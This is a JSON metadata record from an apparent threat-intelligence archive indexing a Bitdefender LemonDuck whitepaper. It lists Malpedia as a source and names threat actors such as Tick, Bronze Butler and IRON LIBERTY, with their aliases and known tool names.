our\n\ncollective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against\n\n**WORLDWIDE OFFICES** all dangers hidden in the arcane intricacies of the digital realm.\n**USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX |**\nToronto, CA This brilliance is our superpower and we put it at the core of all our game-changing products and solutions.\n**Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY**\n| Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona,\nSPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.bitdefender.com/files/News/CaseStudies/study/373/Bitdefender-PR-Whitepaper-LemonDuck-creat4826-en-EN-GenericUse.pdf"
    ],
    "report_names": [
        "Bitdefender-PR-Whitepaper-LemonDuck-creat4826-en-EN-GenericUse.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1601645423,
    "ts_modification_date": 1601645428,
    "files": {
        "pdf": "https://archive.orkl.eu/543db93a2e55f800b9c7044ab657b4748b874351.pdf",
        "text": "https://archive.orkl.eu/543db93a2e55f800b9c7044ab657b4748b874351.txt",
        "img": "https://archive.orkl.eu/543db93a2e55f800b9c7044ab657b4748b874351.jpg"
    }
}